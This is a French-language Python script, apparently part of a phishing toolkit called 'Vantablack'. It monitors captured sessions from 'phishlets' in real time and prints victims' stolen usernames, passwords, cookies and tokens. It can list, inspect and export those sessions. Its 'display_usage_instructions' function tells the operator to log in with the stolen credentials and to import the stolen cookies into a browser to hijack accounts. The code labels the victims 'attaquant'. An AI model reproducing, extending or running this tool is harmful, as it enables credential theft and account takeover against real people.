#!/usr/bin/env python3
"""
Vantablack Core v5 - Monitoring en Temps Réel
Affichage des données capturées avec informations détaillées sur l'attaquant
"""

import os
import json
import time
import asyncio
import threading
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    ORANGE = '\033[38;5;214m'

class RealTimeMonitor:
    def __init__(self):
        self.project_root = Path(__file__).parent
        self.sessions_file = self.project_root / "data" / "sessions.json"
        self.captures_file = self.project_root / "core" / "logs" / "captures.jsonl"
        self.monitoring = False
        self.last_size = 0
        
        # Créer les répertoires si nécessaire
        self.sessions_file.parent.mkdir(exist_ok=True, parents=True)
        self.captures_file.parent.mkdir(exist_ok=True, parents=True)
    
    def detect_os_from_user_agent(self, user_agent: str) -> str:
        """Détecte l'OS à partir du User-Agent"""
        ua = user_agent.lower()
        
        if 'windows' in ua:
            if 'windows nt 10' in ua: return "Windows 10/11"
            if 'windows nt 6.3' in ua: return "Windows 8.1"
            if 'windows nt 6.2' in ua: return "Windows 8"
            if 'windows nt 6.1' in ua: return "Windows 7"
            return "Windows"
        
        elif 'mac' in ua or 'os x' in ua:
            if 'os x 10_' in ua: return "macOS"
            if 'macintosh' in ua: return "macOS"
            return "macOS"
        
        elif 'linux' in ua:
            if 'android' in ua: return "Android"
            if 'ubuntu' in ua: return "Ubuntu Linux"
            if 'debian' in ua: return "Debian Linux"
            if 'fedora' in ua: return "Fedora Linux"
            return "Linux"
        
        elif 'iphone' in ua or 'ipad' in ua:
            return "iOS"
        
        elif 'android' in ua:
            return "Android"
        
        return "Inconnu"
    
    def detect_browser(self, user_agent: str) -> str:
        """Détecte le navigateur"""
        ua = user_agent.lower()
        
        if 'chrome' in ua and 'edg' not in ua: return "Chrome"
        if 'firefox' in ua: return "Firefox"
        if 'safari' in ua and 'chrome' not in ua: return "Safari"
        if 'edg' in ua: return "Edge"
        if 'opera' in ua: return "Opera"
        if 'brave' in ua: return "Brave"
        
        return "Inconnu"
    
    def get_geolocation_info(self, ip: str) -> Dict[str, str]:
        """Récupère les infos de géolocalisation (simulé)"""
        # En production, utiliser une API comme ipapi.co ou ipinfo.io
        return {
            "country": "France",
            "city": "Paris",
            "isp": "Free Mobile",
            "vpn": "Non détecté"
        }
    
    def display_capture(self, data: Dict[str, Any]):
        """Affiche une capture de manière stylisée"""
        print(f"\n{Colors.BOLD}{Colors.RED}🎯 NOUVELLE CAPTURE DÉTECTÉE !{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
        
        # Informations de base
        session_id = data.get('session_id', 'N/A')
        capture_type = data.get('type', 'credentials')
        timestamp = data.get('timestamp', time.time())
        
        print(f"{Colors.BOLD}📅 Heure: {Colors.RESET}{datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Colors.BOLD}🔗 Session: {Colors.RESET}{session_id}")
        print(f"{Colors.BOLD}🎯 Type: {Colors.RESET}{capture_type}")
        
        # Données capturées
        captured_data = data.get('data', {})
        
        if 'username' in captured_data or 'email' in captured_data:
            username = captured_data.get('username') or captured_data.get('email') or 'N/A'
            password = captured_data.get('password', 'N/A')
            
            print(f"{Colors.BOLD}👤 Identifiant: {Colors.GREEN}{username}{Colors.RESET}")
            print(f"{Colors.BOLD}🔒 Mot de passe: {Colors.RED}{password}{Colors.RESET}")
        
        # Cookies et tokens
        if 'cookies' in captured_data:
            cookies = captured_data['cookies']
            print(f"{Colors.BOLD}🍪 Cookies: {Colors.YELLOW}{len(cookies)} capturés{Colors.RESET}")
            for cookie_name, cookie_value in list(cookies.items())[:3]:  # Afficher les 3 premiers
                print(f"   {Colors.ORANGE}{cookie_name}: {cookie_value[:50]}...{Colors.RESET}")
        
        # Informations sur l'attaquant
        if 'remote_ip' in captured_data:
            ip = captured_data['remote_ip']
            user_agent = captured_data.get('user_agent', 'Inconnu')
            
            print(f"{Colors.BOLD}🌐 IP Attaquant: {Colors.BLUE}{ip}{Colors.RESET}")
            
            # Détection OS et navigateur
            os_info = self.detect_os_from_user_agent(user_agent)
            browser = self.detect_browser(user_agent)
            
            print(f"{Colors.BOLD}💻 Système: {Colors.CYAN}{os_info}{Colors.RESET}")
            print(f"{Colors.BOLD}🌐 Navigateur: {Colors.MAGENTA}{browser}{Colors.RESET}")
            
            # Géolocalisation simulée
            geo_info = self.get_geolocation_info(ip)
            print(f"{Colors.BOLD}📍 Localisation: {Colors.GREEN}{geo_info['city']}, {geo_info['country']}{Colors.RESET}")
            print(f"{Colors.BOLD}📡 FAI: {Colors.YELLOW}{geo_info['isp']}{Colors.RESET}")
            print(f"{Colors.BOLD}🛡️ VPN: {Colors.RED if geo_info['vpn'] != 'Non détecté' else Colors.GREEN}{geo_info['vpn']}{Colors.RESET}")
        
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
    
    def display_usage_instructions(self, data: Dict[str, Any]):
        """Affiche comment utiliser les données capturées"""
        capture_type = data.get('type', '')
        captured_data = data.get('data', {})
        
        print(f"{Colors.BOLD}{Colors.GREEN}💡 COMMENT UTILISER CES DONNÉES :{Colors.RESET}")
        
        if 'username' in captured_data and 'password' in captured_data:
            print(f"🔑 {Colors.BOLD}Connexion directe:{Colors.RESET}")
            print(f"   Utilisez les identifiants pour vous connecter au service")
            print(f"   Email: {captured_data.get('email', captured_data.get('username'))}")
            print(f"   Mot de passe: {captured_data.get('password')}")
            print()
        
        if 'cookies' in captured_data:
            print(f"🍪 {Colors.BOLD}Utilisation des cookies:{Colors.RESET}")
            print(f"   Importez les cookies dans votre navigateur")
            print(f"   Ou utilisez des outils comme EditThisCookie")
            print()
        
        if 'remote_ip' in captured_data:
            print(f"🌐 {Colors.BOLD}Informations réseau:{Colors.RESET}")
            print(f"   IP: {captured_data['remote_ip']}")
            print(f"   Peut être utilisée pour le profiling")
            print()
    
    def monitor_captures_file(self):
        """Surveille le fichier de captures en temps réel"""
        print(f"{Colors.BOLD}{Colors.BLUE}🔍 Surveillance des captures en temps réel...{Colors.RESET}")
        print(f"{Colors.YELLOW}📁 Fichier monitoré: {self.captures_file}{Colors.RESET}")
        
        if not self.captures_file.exists():
            print(f"{Colors.RED}❌ Fichier de captures non trouvé{Colors.RESET}")
            return
        
        self.last_size = self.captures_file.stat().st_size
        self.monitoring = True
        
        while self.monitoring:
            try:
                current_size = self.captures_file.stat().st_size
                
                if current_size > self.last_size:
                    # Nouvelles données détectées
                    with open(self.captures_file, 'r') as f:
                        f.seek(self.last_size)
                        new_lines = f.readlines()
                        
                        for line in new_lines:
                            line = line.strip()
                            if line:
                                try:
                                    data = json.loads(line)
                                    self.display_capture(data)
                                    self.display_usage_instructions(data)
                                except json.JSONDecodeError:
                                    continue
                    
                    self.last_size = current_size
                
                time.sleep(0.5)  # Vérifier toutes les 500ms
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}⏹️ Surveillance arrêtée{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}❌ Erreur de monitoring: {e}{Colors.RESET}")
                time.sleep(2)
    
    def list_all_sessions(self):
        """Liste toutes les sessions capturées"""
        if not self.sessions_file.exists():
            print(f"{Colors.YELLOW}ℹ️ Aucune session capturée{Colors.RESET}")
            return
        
        try:
            with open(self.sessions_file, 'r') as f:
                sessions_data = json.load(f)
            
            print(f"{Colors.BOLD}{Colors.BLUE}📊 SESSIONS CAPTURÉES ({len(sessions_data)}){Colors.RESET}")
            print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
            
            for session_id, session_data in sessions_data.items():
                creds_count = len(session_data.get('credentials', []))
                tokens_count = len(session_data.get('tokens', {}))
                
                print(f"{Colors.BOLD}🔗 {session_id}{Colors.RESET}")
                print(f"   📅 Créé: {session_data.get('created_at', 'N/A')}")
                print(f"   🌐 IP: {session_data.get('remote_ip', 'N/A')}")
                print(f"   🎯 Phishlet: {session_data.get('phishlet_name', 'N/A')}")
                print(f"   👤 Identifiants: {Colors.GREEN}{creds_count}{Colors.RESET}")
                print(f"   🍪 Tokens: {Colors.YELLOW}{tokens_count}{Colors.RESET}")
                print(f"   {Colors.BOLD}{'-'*40}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}❌ Erreur lecture sessions: {e}{Colors.RESET}")
    
    def show_session_details(self, session_id: str):
        """Affiche le détail d'une session"""
        if not self.sessions_file.exists():
            print(f"{Colors.RED}❌ Fichier sessions non trouvé{Colors.RESET}")
            return
        
        try:
            with open(self.sessions_file, 'r') as f:
                sessions_data = json.load(f)
            
            session_data = sessions_data.get(session_id)
            if not session_data:
                print(f"{Colors.RED}❌ Session {session_id} non trouvée{Colors.RESET}")
                return
            
            print(f"{Colors.BOLD}{Colors.BLUE}📋 DÉTAILS SESSION: {session_id}{Colors.RESET}")
            print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
            
            # Informations de base
            print(f"{Colors.BOLD}🎯 Phishlet: {Colors.CYAN}{session_data.get('phishlet_name', 'N/A')}{Colors.RESET}")
            print(f"{Colors.BOLD}🌐 IP: {Colors.BLUE}{session_data.get('remote_ip', 'N/A')}{Colors.RESET}")
            print(f"{Colors.BOLD}💻 User-Agent: {Colors.MAGENTA}{session_data.get('user_agent', 'N/A')}{Colors.RESET}")
            print(f"{Colors.BOLD}📅 Création: {Colors.YELLOW}{session_data.get('created_at', 'N/A')}{Colors.RESET}")
            print(f"{Colors.BOLD}⚡ Dernière activité: {Colors.ORANGE}{session_data.get('last_activity', 'N/A')}{Colors.RESET}")
            
            # Identifiants capturés
            credentials = session_data.get('credentials', [])
            if credentials:
                print(f"\n{Colors.BOLD}{Colors.RED}🔑 IDENTIFIANTS CAPTURÉS ({len(credentials)}){Colors.RESET}")
                for cred in credentials:
                    print(f"   👤 {cred.get('username', 'N/A')}")
                    print(f"   🔒 {cred.get('password', 'N/A')}")
                    print(f"   📍 {cred.get('url', 'N/A')}")
                    print(f"   {Colors.BOLD}{'-'*30}{Colors.RESET}")
            
            # Tokens et cookies
            tokens = session_data.get('tokens', {})
            if tokens:
                print(f"\n{Colors.BOLD}{Colors.YELLOW}🍪 TOKENS CAPTURÉS ({len(tokens)}){Colors.RESET}")
                for token_name, token_value in tokens.items():
                    print(f"   {token_name}: {token_value[:50]}...")
        
        except Exception as e:
            print(f"{Colors.RED}❌ Erreur: {e}{Colors.RESET}")
    
    def export_session(self, session_id: str, output_file: str):
        """Exporte une session vers un fichier"""
        if not self.sessions_file.exists():
            print(f"{Colors.RED}❌ Fichier sessions non trouvé{Colors.RESET}")
            return
        
        try:
            with open(self.sessions_file, 'r') as f:
                sessions_data = json.load(f)
            
            session_data = sessions_data.get(session_id)
            if not session_data:
                print(f"{Colors.RED}❌ Session {session_id} non trouvée{Colors.RESET}")
                return
            
            with open(output_file, 'w') as f:
                json.dump(session_data, f, indent=2, ensure_ascii=False)
            
            print(f"{Colors.GREEN}✅ Session exportée: {output_file}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}❌ Erreur export: {e}{Colors.RESET}")
    
    def interactive_monitor(self):
        """Interface interactive de monitoring"""
        while True:
            print(f"\n{Colors.BOLD}{Colors.CYAN}=== VANTABLACK MONITOR v5 ==={Colors.RESET}")
            print(f"{Colors.GREEN}1.{Colors.RESET} Surveillance temps réel")
            print(f"{Colors.GREEN}2.{Colors.RESET} Lister toutes les sessions")
            print(f"{Colors.GREEN}3.{Colors.RESET} Détails d'une session")
            print(f"{Colors.GREEN}4.{Colors.RESET} Exporter une session")
            print(f"{Colors.GREEN}5.{Colors.RESET} Voir les fichiers de données")
            print(f"{Colors.GREEN}0.{Colors.RESET} Quitter")
            
            choice = input(f"\n{Colors.YELLOW}➤ Choix: {Colors.RESET}").strip()
            
            if choice == "1":
                self.monitor_captures_file()
            elif choice == "2":
                self.list_all_sessions()
            elif choice == "3":
                session_id = input(f"{Colors.YELLOW}➤ ID de la session: {Colors.RESET}").strip()
                if session_id:
                    self.show_session_details(session_id)
            elif choice == "4":
                session_id = input(f"{Colors.YELLOW}➤ ID de la session: {Colors.RESET}").strip()
                output_file = input(f"{Colors.YELLOW}➤ Fichier de sortie: {Colors.RESET}").strip() or f"{session_id}.json"
                if session_id:
                    self.export_session(session_id, output_file)
            elif choice == "5":
                print(f"{Colors.BOLD}📁 Fichiers de données:{Colors.RESET}")
                print(f"   Sessions: {self.sessions_file}")
                print(f"   Captures temps réel: {self.captures_file}")
                if self.sessions_file.exists():
                    size_kb = self.sessions_file.stat().st_size / 1024
                    print(f"   Taille: {size_kb:.1f} KB")
            elif choice == "0":
                print(f"{Colors.GREEN}👋 Au revoir!{Colors.RESET}")
                break
            else:
                print(f"{Colors.RED}❌ Choix invalide{Colors.RESET}")

def main():
    """Point d'entrée principal"""
    print(f"{Colors.BOLD}{Colors.MAGENTA}🎯 Vantablack Monitor v5 - Surveillance Temps Réel{Colors.RESET}")
    print(f"{Colors.YELLOW}Affichage des données capturées avec analyse de l'attaquant{Colors.RESET}")
    
    monitor = RealTimeMonitor()
    monitor.interactive_monitor()

if __name__ == "__main__":
    main()